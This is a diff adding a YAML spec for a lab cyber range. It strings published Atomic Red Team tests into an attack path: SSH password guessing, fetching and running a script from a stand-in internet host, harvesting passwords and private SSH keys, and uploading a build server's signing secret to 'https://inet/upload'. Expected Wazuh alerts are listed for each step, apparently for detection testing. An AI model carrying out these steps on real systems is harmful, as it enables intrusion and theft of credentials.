@@ -1,0 +1,75 @@
+# Range one: the spec of a small network and the path of published tests that runs through it.
+# This file holds the path for now. Networks, hosts, the defense and ordinary activity follow.
+range: range-one
+version: 1
+sentence: >-
+  An attacker on the internet guesses a weak SSH password on a shop's web
+  server, looks around, finds a deploy key, uses it to pull the build server's
+  configuration, and uploads it out over HTTPS, while Wazuh watches web, build and db.
+atomic_red_team:
+  repo: redcanaryco/atomic-red-team
+  commit: a0e3f9bc69fed2fd711bd1f1aa87a40c33482fe6  # pragma: allowlist secret
+executor:
+  reference: redcanaryco/invoke-atomicredteam
+  commit: 8af478bb9e4637df568ac1e596553b025b16cd1b  # pragma: allowlist secret
+path:
+  goal:
+    plain: "build's signing secret reaches inet"
+    after: s10
+    check: {upload: first, from: "{ip:web@edge}", contains: "tmp/stage/etc.tar.gz",
+            inner: "buildbot/signing.env", equals: "build:/etc/buildbot/signing.env"}
+  steps:
+    - {id: s01, technique: T1110.004, guid: 4f08197a-2a8a-472d-9589-cd2895ef22ad,
+       name: SSH Credential Stuffing From Linux, host: attacker, account: root, workdir: /tmp,
+       args: {target_host: web}, timeout: 600, cleanup: none,
+       check: {host: web, run: "grep -q 'Accepted password for webadmin from {ip:attacker@edge} ' /var/log/auth.log"},
+       expect: [5710, 5716, 5712, 5720, 5763, 5715, 5501, 40112]}
+    - {id: s02, technique: T1105, guid: bdc373c5-e9cf-4563-8a7b-a9ba720a90f3,
+       name: Linux Download File and Run, host: web, account: webadmin, workdir: /tmp,
+       args: {remote_url: "http://inet/atomics/T1105/src/atomic.sh", payload_name: atomic.sh},
+       cleanup: after_check,
+       check: {all: [{output_contains: "Hello From Atomic Red Team"},
+                     {host: inet, run: "grep -q '^{ip:web@edge} GET /atomics/T1105/src/atomic.sh 200' /var/log/inet/access.log"}]},
+       expect: [554]}
+    - {id: s03, technique: T1082, guid: cccb070c-df86-4216-a5bc-9fb60c74e27c,
+       name: List OS Information, host: web, account: webadmin, workdir: /tmp,
+       args: {output_file: /tmp/T1082.txt}, cleanup: after_check,
+       check: {host: web, run: "grep -q Linux /tmp/T1082.txt"}, expect: [554]}
+    - {id: s04, technique: T1018, guid: 6fc814cb-16d1-43e6-80b3-2ff2a45250d1,
+       name: Enumerate SSH Configuration, host: web, account: webadmin, workdir: /tmp,
+       args: {search_path: "/home/webadmin", filename: known_hosts, output_file: /tmp/ssh_enum.txt},
+       cleanup: after_check,
+       check: {host: web, run: "grep -q '^build ' /tmp/ssh_enum.txt"}, expect: [554]}
+    - {id: s05a, technique: T1046, guid: 68e907da-2539-48f6-9fc9-257a78c05540,
+       name: Port Scan, host: web, account: webadmin, workdir: /tmp, args: {host: build},
+       timeout: 300, cleanup: none, check: {output_contains: "port 22 is open"}, expect: []}
+    - {id: s05b, technique: T1046, guid: 68e907da-2539-48f6-9fc9-257a78c05540,
+       name: Port Scan, host: web, account: webadmin, workdir: /tmp, args: {host: db},
+       timeout: 300, cleanup: none, check: {output_contains: "port 3306 is open"}, expect: []}
+    - {id: s06, technique: T1552.001, guid: bd4cf0d1-7646-474e-8610-78ccf5a097c4,
+       name: Extract passwords with grep, host: web, account: webadmin, workdir: /tmp,
+       args: {file_path: /var/www/app}, cleanup: none,
+       check: {output_contains: "Shop-Db-2026"}, expect: []}
+    - {id: s07, technique: T1552.004, guid: 46959285-906d-40fa-9437-5a439accd878,
+       name: Discover Private SSH Keys, host: web, account: webadmin, workdir: /tmp,
+       args: {search_path: "/home/webadmin", filename: id_rsa,
+              optional_flags: "-exec sh -c 'echo \"=== $1 ===\" >> /tmp/creds.txt; cat \"$1\" >> /tmp/creds.txt' _ {} \\;"},
+       cleanup: after_check,
+       check: {host: web, run: "grep -q 'BEGIN OPENSSH PRIVATE KEY' /tmp/creds.txt"},  # pragma: allowlist secret
+       expect: [554]}
+    - {id: s08, technique: T1048, guid: f6786cc8-beda-4915-a4d6-ac2f193bb988,
+       name: Exfiltration Over Alternative Protocol - SSH, host: web, to: build,
+       account: webadmin, workdir: /tmp/stage, args: {domain: deploy@build}, cleanup: none,
+       check: {host: web, run: "tar -tzf /tmp/stage/etc.tar.gz | grep -qx 'buildbot/signing.env'"},
+       expect: [5715, 5501, 554]}
+    - {id: s09, technique: T1560.001, guid: 7af2b51e-ad1c-498c-aca8-d3290c19535a,
+       name: Data Compressed - nix - tar Folder or File, host: web, account: webadmin, workdir: /tmp,
+       args: {input_file_folder: /tmp/stage, output_file: /tmp/loot.tar.gz}, cleanup: after_path,
+       check: {host: web, run: "tar -tzf /tmp/loot.tar.gz | grep -qx 'tmp/stage/etc.tar.gz'"},
+       expect: [554]}
+    - {id: s10, technique: T1048.002, guid: 7ccdfcfa-6707-46bc-b812-007ab6ff951c,
+       name: Exfiltrate data in a file over HTTPS using wget, host: web, to: inet, account: webadmin,
+       workdir: /tmp, args: {input_file: /tmp/loot.tar.gz, endpoint_domain: "https://inet/upload"},
+       cleanup: none,
+       check: {upload: first, from: "{ip:web@edge}", sha256_equals: "web:/tmp/loot.tar.gz"},
+       expect: []}
